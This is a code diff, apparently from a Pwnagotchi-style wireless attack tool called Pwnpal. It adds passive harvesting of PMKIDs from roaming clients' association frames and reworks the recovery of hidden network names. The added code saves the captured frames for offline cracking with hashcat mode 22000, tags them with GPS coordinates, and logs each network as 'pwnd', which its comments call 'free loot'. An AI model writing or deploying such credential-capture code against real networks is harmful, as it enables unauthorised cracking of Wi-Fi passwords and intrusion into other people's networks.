@@ -1138,16 +1138,31 @@ void Pwnpal::reportDecloak(const uint8_t* payload, int length, int rssi, int cha
                            bool has_fix, double lat, double lon) {
     if (length < 30) return;
     uint8_t sub = payload[0] & 0xf0;
-    int ie;
-    if (sub == 0x00)      ie = 28;   // assoc-req:   24 hdr + capability(2) + listen interval(2)
-    else if (sub == 0x20) ie = 34;   // reassoc-req: + current-AP address(6)
-    else return;
+    if (sub != 0x00 && sub != 0x20) return;               // assoc-req / reassoc-req only
+    const uint8_t* bssid = payload + 4;                    // Addr1 = the AP being (re)joined
+    int ri = reconIndex(bssid);
+    if (ri < 0) return;                                    // need the known AP (for its ESSID anyway)
+    has_fix = geoResolve(has_fix, &lat, &lon);
+
+    // Passive PMKID: a roaming client's (re)assoc RSN IE can carry a cached PMKID for this AP, which
+    // cracks with -m 22000 just like an AP M1 PMKID. Harvest it once per AP — save the frame (offline
+    // tools and the Flipper's own check read the PMKID out) and count it. Free loot we'd else drop.
+    uint8_t pmk[16];
+    if (pwnpal_assoc_pmkid(payload, length, pmk) && markPwnd(bssid)) {
+        streamFrameHex(bssid, payload, length);
+        streamSyntheticBeacon(bssid, _recon[ri].ssid);     // splice ESSID (no-op if still unknown)
+        _epoch_pwnd = true;
+        _ep_pmkid++;
+        emitPwnd(bssid, _recon[ri].ssid, "pmkid", channel, rssi, has_fix, lat, lon,
+                 _recon[ri].attacks > 0);
+    }
+
+    // De-cloak: recover a hidden ESSID from the (re)assoc SSID IE.
+    int ie = (sub == 0x20) ? 34 : 28;   // reassoc adds the 6-byte current-AP address before the IEs
     if (ie + 2 > length || payload[ie] != 0x00) return;   // SSID must be the first tagged param
     int slen = payload[ie + 1];
     if (slen <= 0 || slen > 32 || ie + 2 + slen > length) return;  // len 0 = still cloaked
-    const uint8_t* bssid = payload + 4;                    // Addr1 = the AP being (re)joined
-    int ri = reconIndex(bssid);
-    if (ri < 0 || _recon[ri].ssid[0] != '\0') return;     // unknown AP, or already named
+    if (_recon[ri].ssid[0] != '\0') return;               // already named
     char raw[33], ssid[33];
     memcpy(raw, payload + ie + 2, slen);
     raw[slen] = '\0';
@@ -1156,7 +1171,6 @@ void Pwnpal::reportDecloak(const uint8_t* payload, int length, int rssi, int cha
     strncpy(_recon[ri].ssid, ssid, sizeof(_recon[ri].ssid) - 1);
     _recon[ri].ssid[sizeof(_recon[ri].ssid) - 1] = '\0';
     _ep_dcloak++;                                          // telemetry: a hidden AP named this epoch
-    has_fix = geoResolve(has_fix, &lat, &lon);
     char mac[18];
     fmt_mac(mac, bssid);
     char geo[48];
